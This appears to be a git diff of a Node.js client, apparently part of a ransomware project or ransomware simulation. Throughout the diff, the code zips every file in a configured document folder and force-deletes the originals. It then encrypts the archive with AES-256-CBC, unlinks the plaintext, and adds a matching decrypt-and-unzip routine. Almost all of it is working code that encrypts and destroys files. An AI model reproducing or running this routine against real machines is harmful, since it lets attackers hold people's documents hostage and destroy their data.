@@ -6,6 +6,9 @@ const config = require('./client_config');
 const os = require('os');
 const mac = require('macaddress');
 const ip = require('ip');
+const zipdir = require('zip-dir');
+const fse = require('fs-extra');
+const yauzl = require('yauzl');
 
 let encKey = null;
 let encrypted = false;
@@ -15,34 +18,52 @@ let currentKey = null;
 const encrypt = (key) => {
     return new Promise((resolve, reject) => {
         const docPath = path.join(config.DOCUMENT_LOCATION);
-        fs.readdir(docPath, (err, files) => {
-            if (err) {
-                console.log('Unable to scan directory: ' + err);
-                reject(err);
-            }
-            encKey = key;
-            let encPromises = files.map(file => {
-                return new Promise((resolve, reject) => {
-                    const cipher = crypto.createCipher('aes-256-cbc', key);
-                    let filepath = path.join(config.DOCUMENT_LOCATION, file);
-                    let encFilePath = path.join(config.DOCUMENT_LOCATION, `${file}.enc`);
-                    console.log('Encrypting ' + file);
-                    const handle = fs.createReadStream(filepath).pipe(cipher).pipe(fs.createWriteStream(encFilePath));
-                    handle.on('finish', () => {
-                        console.log(file + ' Encrypted!');
-                        resolve();
+        let zipPromise = new Promise((resolve1, reject1) => {
+            let fileArr = [];
+            zipdir(docPath, {
+                saveTo: path.join(docPath, 'docs.zip'),
+                each: (f) => {
+                    fileArr.push(f);
+                }
+            }, (err, buffer) => {
+                if (err) reject1(err);
+                resolve1(fileArr)
+            });
+        });
+
+        zipPromise.then((fileArr) => {
+            fileArr.map(f => {
+                fse.removeSync(f);
+            });
+            fs.readdir(docPath, (err, files) => {
+                if (err) {
+                    console.log('Unable to scan directory: ' + err);
+                    reject(err);
+                }
+                encKey = key;
+                let encPromises = files.map(file => {
+                    return new Promise((resolve, reject) => {
+                        const cipher = crypto.createCipher('aes-256-cbc', key);
+                        let filepath = path.join(config.DOCUMENT_LOCATION, file);
+                        let encFilePath = path.join(config.DOCUMENT_LOCATION, `${file}.enc`);
+                        console.log('Encrypting ' + file);
+                        const handle = fs.createReadStream(filepath).pipe(cipher).pipe(fs.createWriteStream(encFilePath));
+                        handle.on('finish', () => {
+                            console.log(file + ' Encrypted!');
+                            resolve();
+                        });
                     });
                 });
+                Promise.all(encPromises).then(() => {
+                    encrypted = true;
+                    files.forEach(f => {
+                        let filepath = path.join(config.DOCUMENT_LOCATION, f);
+                        console.debug('Deleting ' + filepath);
+                        fs.unlinkSync(filepath);
+                    });
+                    resolve();
+                })
             });
-            Promise.all(encPromises).then(() => {
-                encrypted = true;
-                files.forEach(f => {
-                    let filepath = path.join(config.DOCUMENT_LOCATION, f);
-                    console.debug('Deleting ' + filepath);
-                    fs.unlinkSync(filepath);
-                });
-                resolve();
-            })
         });
     });
 };
@@ -66,7 +87,27 @@ const decrypt = (key) => {
                         console.log(`Deleting ${encFilepath}`);
                         try {
                             fs.unlinkSync(encFilepath);
-                            resolve()
+                            yauzl.open(originFilePath, {lazyEntries: true}, function (err, zipfile) {
+                                zipfile.on("close", () => {
+                                    resolve(originFilePath)
+                                });
+                                if (err) reject(err);
+                                zipfile.readEntry();
+                                zipfile.on("entry", (entry) => {
+                                    if (/\/$/.test(entry.fileName)) {
+                                        fse.ensureDirSync(path.join(config.DOCUMENT_LOCATION, entry.fileName));
+                                        zipfile.readEntry();
+                                    } else {
+                                        zipfile.openReadStream(entry, function (err, readStream) {
+                                            if (err) throw err;
+                                            readStream.on("end", function () {
+                                                zipfile.readEntry();
+                                            });
+                                            readStream.pipe(fs.createWriteStream(path.join(config.DOCUMENT_LOCATION, entry.fileName)));
+                                        });
+                                    }
+                                })
+                            });
                         } catch (e) {
                             reject(e)
                         }
@@ -74,6 +115,7 @@ const decrypt = (key) => {
                 });
             });
             Promise.all(decPromises).then(() => {
+                fs.unlinkSync(path.join(config.DOCUMENT_LOCATION, 'docs.zip'));
                 encrypted = false;
                 encKey = null;
                 resolve();
